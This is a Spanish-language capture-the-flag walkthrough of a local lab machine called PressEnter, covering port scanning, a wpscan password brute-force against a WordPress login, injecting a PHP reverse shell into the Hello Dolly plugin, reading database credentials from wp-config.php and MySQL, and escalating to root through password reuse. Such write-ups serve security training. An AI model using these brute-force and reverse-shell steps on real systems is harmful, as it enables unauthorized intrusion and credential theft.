---
icon: flag
---

# CTF PressEnter Easy

URL Download CTF = [https://drive.google.com/file/d/1jL4MGd\_4J2bPyS5ZFuKPNYSbXrhiHVQc/view?usp=sharing](https://drive.google.com/file/d/1jL4MGd_4J2bPyS5ZFuKPNYSbXrhiHVQc/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip pressenter.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh pressenter.tar
```

Info:

```

___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 10:02 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Pressenter CTF
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:12:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
```

Vemos que solo tenemos un puerto `80` abierto, si nos metemos a el no vemos gran cosa, pero si vamos al pie de pagina y vemos lo siguiente.

```
Find us at pressenter.hl
```

Por lo que vemos se esta utilizando un dominio y si clicamos en el, nos redirige a un dominio en el que no carga bien la pagina, ya que la resolucion no la esta haciendo, por lo que añadiremos ese dominio con la IP en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>        pressenter.hl
```

Lo guardamos y si recargamos la pagina ahora si la veremos mejor, por lo que vemos esta utilizando un `wordpress` y en el vemos a un usuario llamado `pressi`, por lo que haremos lo siguiente.

## wpscan

```shell
wpscan --url http://pressenter.hl/ --usernames pressi --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://pressenter.hl/ [172.18.0.2]
[+] Started: Thu Aug 22 10:14:17 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://pressenter.hl/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://pressenter.hl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://pressenter.hl/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://pressenter.hl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:03 <=======================================================================================================> (702 / 702) 100.00% Time: 00:00:03
[i] The WordPress version could not be detected.

[+] WordPress theme in use: twentytwentyfour
 | Location: http://pressenter.hl/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.2 (up to date)
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://pressenter.hl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - pressi / dumbass                                                                                                                                                            
Trying pressi / caitlyn Time: 00:00:19 <                                                                                                       > (2980 / 14347372)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: pressi, Password: dumbass

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug 22 10:15:26 2024
[+] Requests Done: 4424
[+] Cached Requests: 7
[+] Data Sent: 1.909 MB
[+] Data Received: 31.063 MB
[+] Memory used: 317.715 MB
[+] Elapsed time: 00:01:08
```

Por lo que vemos nos saca las credenciales del usuario `pressi`, ahora nos logearemos en el `worpress`.

```
URL = http://pressenter.hl/wp-admin/
```

Y metemos las credenciales:

```
User = pressi
Pass = dumbass
```

Una vez dentro iremos a crearnos una `Reverse Shell` de la siguiente forma.

### Reverse Shell

Si nos vamos a la seccion de `plugins` veremos uno que viene por defecto en todos los `wordpress` llamado `Hellow Dolly`, aprovecharemos ese plugin para injectar codigo `php` y cuando lo activemos que lo ejecute, nos iremos principalmente a la seccion de `Herramientas` y dentro del desplegable seleccionaremos `Editor de archivos de plugins` la ultima opcion.

Dentro de aqui solo habra un archivo llamado `hello.php` dentro del mismo injectaremos una reverse shell de la siguiente forma.

```shell
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Metiendo esa linea de codigo dentro de las aperturas del contenido de `php` le daremos al boton de `Actualizar archivo` y los cambios ya estaras guardados, ahora antes de activar el plugin, tendremos que estar a la escucha.

```shell
nc -lvnp <PORT>
```

Y una vez hecho esto, en la pagina de `wordpress` nos vamos a la seccion de `plugins` y el plugin llamado `Hellow Dolly` le daremos a `Activar`.

Nos saltara un error en `wordpress` pero si vamos a la escucha habremos obtenido una shell con el usuario `www-data`.

```
connect to [192.168.5.145] from (UNKNOWN) [172.18.0.2] 46138
whoami
www-data
```

Sanitizamos la shell (TTY).

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user enter

Si nos vamos a la siguiente direccion de directorio.

```shell
cd /var/www/pressenter/
```

Podremos ver el tipico archivo de configuracion de `wordpress` donde suelen contener las credenciales para conectarte por `mysql` llamado `wp-config.php` y si lo leemos.

```shell
cat wp-config.php
```

Info:

```php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'rooteable' );

/** Database hostname */
define( 'DB_HOST', '127.0.0.1' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Vemos la seccion interesante donde obtenemos las credenciales para conectarnos por `mysql`.

### mysql credentials

```shell
mysql -u admin -prooteable
```

Y con eso estariamos dentro, listamos las bases de datos y nos metemos en la de `wordpress`, dentro de la misma en las tablas hay una que no suele estar llamada `wp_usernames`, si la vemos por dentro veremos que son las credenciales del usuario `enter`.

```shell
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
3 rows in set (0.00 sec)
```

Las tablas.

```shell
use wordpress;
show tables;
```

Info:

```
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_usernames          |
| wp_users              |
+-----------------------+
13 rows in set (0.00 sec)
```

Las credenciales de la tabla `wp_usernames`.

```shell
select * from wp_usernames;
```

Info:

```
+----+----------+-----------------+---------------------+
| id | username | password        | created_at          |
+----+----------+-----------------+---------------------+
|  1 | enter    | kernellinuxhack | 2024-08-22 13:18:04 |
+----+----------+-----------------+---------------------+
1 row in set (0.00 sec)
```

Por lo que nos cambiaremos al usuario `enter`.

```
User = enter
Pass = kernellinuxhack
```

```shell
su enter
```

Metemos la contraseña obtenida y ya estaria, por lo que leeremos la flag.

> user.txt

```
4a05a7bc45edb56b1f033ca1606e176c
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for enter on 3c646d90bb75:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User enter may run the following commands on 3c646d90bb75:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
    (ALL : ALL) NOPASSWD: /usr/bin/whoami
```

Pero no podemos hacer gran cosa con eso, por lo que esta hecho para despistar, pero si probamos a reutilizar la misma contarseña con el usuario `root`.

```shell
su root
```

Y ponemos la contraseña `kernellinuxhack` veremos que tambien tiene esa contraseña, por lo que ya seremos `root` y leeremos la flag.

> root\_true.txt

```
4e4a603de810988e0842777de1d97e68
```
